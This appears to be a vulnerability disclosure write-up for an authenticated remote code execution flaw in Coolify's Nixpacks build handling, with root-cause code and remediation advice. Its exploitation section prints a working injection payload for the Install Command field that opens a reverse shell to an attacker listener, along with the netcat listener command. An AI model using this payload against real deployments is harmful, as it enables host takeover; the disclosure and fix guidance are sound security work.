repo.description: ## 1. Executive Summary A critical **Authenticated Host Remote Code Execution (RCE)** vulnerability was discovered in Coolify v4.0.0-beta.469. The flaw resides in the handling of user-defined build parameters for the **Nixpacks** build pack. Specifically, the `install_command` provided by a user is directly concatenated into a shell command string that is executed on the deployment host during the building phase. An attacker can leverage this to escape the intended build context and execute arbitrary commands with host-level privileges. ## 2. Technical Vulnerability Analysis ### Vulnerable Component - **File:** [app/Jobs/ApplicationDeploymentJob.php](file:///home/veronica/bot/vulnerability_research/src/app/Jobs/ApplicationDeploymentJob.php) (Line 2335) - **Function:** [nixpacks_build_cmd()](file:///home/veronica/bot/vulnerability_research/src/app/Jobs/ApplicationDeploymentJob.php#2332-2349) - **Sink:** [executeInDocker()](file:///home/veronica/bot/vulnerability_research/src/bootstrap/helpers/docker.php#140-146) -> `remote_process()` ### Root Cause Identification The vulnerability stems from an insecure command construction pattern. In the [nixpacks_build_cmd](file:///home/veronica/bot/vulnerability_research/src/app/Jobs/ApplicationDeploymentJob.php#2332-2349) method, several application configuration parameters, including `install_command`, are used to build a command-line string for the [nixpacks](file:///home/veronica/bot/vulnerability_research/src/app/Jobs/ApplicationDeploymentJob.php#2332-2349) binary. ```php // app/Jobs/ApplicationDeploymentJob.php private function nixpacks_build_cmd() { ... if ($this->application->install_command) { $nixpacks_command .= " --install-cmd \"{$this->application->install_command}\""; } ... return $nixpacks_command; } ``` The `install_command` is wrapped in double quotes, but the input is not sanitized or escaped. This constructed string is then passed to [executeInDocker()](file:///home/veronica/bot/vulnerability_research/src/bootstrap/helpers/docker.php#140-146), which wraps it in a `bash -c` call: ```php // bootstrap/helpers/docker.php:140 function executeInDocker(string $containerId, string $command) { $escapedCommand = str_replace("'", "'\\''", $command); return "docker exec {$containerId} bash -c '{$escapedCommand}'"; } ``` Because the original `nixpacks_command` uses double quotes for the `--install-cmd` argument, an attacker can break out of the quotes (`"`) and inject arbitrary shell commands (using `;`). ## 3. Professional Exploitation Narrative ### Phase 1: Authentication & Access The attacker start by logging into the Coolify dashboard using valid credentials. Any user account with permissions to create or manage projects can exploit this vulnerability. ### Phase 2: Malicious Resource Configuration The attacker navigates to a project (e.g., "PwnProject") and selects "Add New Resource". They choose a "Public Repository" and provide a standard Git URL. During the configuration phase, they select **Nixpacks** as the Build Pack. ### Phase 3: Payload Injection (The "Why") To achieve RCE, the attacker targets the **Install Command** field. This field is ideal because it is one of the first custom commands executed during the build process on the host (within the builder container). The attacker enters the following payload: `"; bash -i >& /dev/tcp/172.23.0.1/1337 0>&1; #` **Analysis of the Payload:** 1. `";` - This closes the intended [nixpacks](file:///home/veronica/bot/vulnerability_research/src/app/Jobs/ApplicationDeploymentJob.php#2332-2349) argument string and terminates the first command. 2. `bash -i >& /dev/tcp/172.23.0.1/1337 0>&1;` - This initiates an interactive reverse shell back to the attacker's listener on the host gateway. 3. `#` - This comments out the remaining part of the original Nixpacks command, ensuring no syntax errors interfere with the shell execution. ### Phase 4: Establishing Command & Control On the attacker's machine (the host in this scenario), a Netcat listener is initialized to catch the incoming connection: ```bash nc -lvp 1337 ``` ### Phase 5: Deployment & Compromise The attacker saves the configuration and clicks **Deploy**. Coolify triggers the deployment job. As soon as the "Generating nixpacks plan" step begins, the injected `bash` command is executed by the host's shell. The attacker immediately receives a standard reverse shell, granting them full access to the environment. ## 4. Remediation & Fix Recommendations ### Short-Term Mitigation (Escaping) All user-provided command strings MUST be properly escaped before being included in a shell command. Use `escapeshellarg()` for every argument. ```php // Fixed implementation if ($this->application->install_command) { $nixpacks_command .= " --install-cmd " . escapeshellarg($this->application->install_command); } ``` ### Long-Term Prevention 1. **Strict Sanitization:** Implement a regex whitelist for allowed characters in build step fields. 2. **Architectural Isolation:** Build processes should run in highly restricted, isolated environments without access to sensitive network interfaces or host sockets. --- **Note:** For this Proof of Concept, visual evidence has been captured to verify each step of the exploit.
